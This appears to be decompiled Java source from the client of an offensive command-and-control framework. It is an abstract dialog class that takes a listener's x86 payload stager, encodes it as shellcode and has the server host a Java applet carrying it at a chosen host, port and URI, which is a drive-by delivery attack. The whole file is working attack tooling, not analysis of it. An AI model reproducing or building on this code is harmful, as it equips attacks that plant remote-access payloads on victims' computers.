package aggressor.dialogs;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import common.Callback;
import common.CommonUtils;
import common.ListenerUtils;
import dialog.DialogListener;
import dialog.DialogManager;
import dialog.DialogUtils;
import encoders.Base64;
import java.awt.event.ActionEvent;
import java.util.Map;
import java.util.Stack;
import javax.swing.JButton;
import javax.swing.JFrame;
import sleep.runtime.SleepUtils;

public abstract class JavaAppletDialog implements DialogListener, Callback {
   protected JFrame dialog = null;
   protected AggressorClient client = null;
   protected String host;
   protected String port;
   protected String uri;
   protected String lname;
   protected String proto;
   protected boolean ssl;

   public JavaAppletDialog(AggressorClient var1) {
      this.client = var1;
   }

   public void dialogAction(ActionEvent var1, Map var2) {
      this.uri = DialogUtils.string(var2, "uri");
      this.host = DialogUtils.string(var2, "host");
      this.port = DialogUtils.string(var2, "port");
      this.lname = DialogUtils.string(var2, "listener");
      this.ssl = DialogUtils.bool(var2, "ssl");
      this.proto = this.ssl ? "https://" : "http://";
      byte[] var3 = CommonUtils.readResource(this.getResourceName());
      byte[] var4 = ListenerUtils.getListener(this.client, this.lname).getPayloadStager("x86");
      String var5 = this.formatShellcode(var4);
      this.client.getConnection().call("cloudstrike.host_applet", CommonUtils.args(this.host, Integer.parseInt(this.port), this.ssl, this.uri, var3, var5, this.getMainClass(), this.getShortDescription()), this);
   }

   public abstract String getResourceName();

   public abstract String getMainClass();

   public abstract String getShortDescription();

   public abstract String getTitle();

   public abstract String getURL();

   public abstract String getDescription();

   public abstract String getDefaultURL();

   public String formatShellcode(byte[] var1) {
      Stack var2 = new Stack();
      var2.push(SleepUtils.getScalar(var1));
      String var3 = this.client.getScriptEngine().format("APPLET_SHELLCODE_FORMAT", var2);
      return var3 != null ? var3 : Base64.encode(var1);
   }

   public void result(String var1, Object var2) {
      String var3 = var2 + "";
      if ("success".equals(var3)) {
         DialogUtils.startedWebService("host applet", this.proto + this.host + ":" + this.port + this.uri);
      } else {
         DialogUtils.showError("Unable to start web server:\n" + var3);
      }

   }

   public void show() {
      this.dialog = DialogUtils.dialog(this.getTitle(), 640, 480);
      DialogManager var1 = new DialogManager(this.dialog);
      var1.addDialogListener(this);
      var1.set("uri", this.getDefaultURL());
      var1.set("port", "80");
      var1.set("host", DataUtils.getLocalIP(this.client.getData()));
      var1.text("uri", "Local URI:", 20);
      var1.text("host", "Local Host:", 20);
      var1.text("port", "Local Port:", 20);
      var1.sc_listener_stagers("listener", "Listener:", this.client);
      var1.checkbox_add("ssl", "SSL:", "Enable SSL", DataUtils.hasValidSSL(this.client.getData()));
      JButton var2 = var1.action("Launch");
      JButton var3 = var1.help(this.getURL());
      this.dialog.add(DialogUtils.description(this.getDescription()), "North");
      this.dialog.add(var1.layout(), "Center");
      this.dialog.add(DialogUtils.center(var2, var3), "South");
      this.dialog.pack();
      this.dialog.setVisible(true);
   }
}
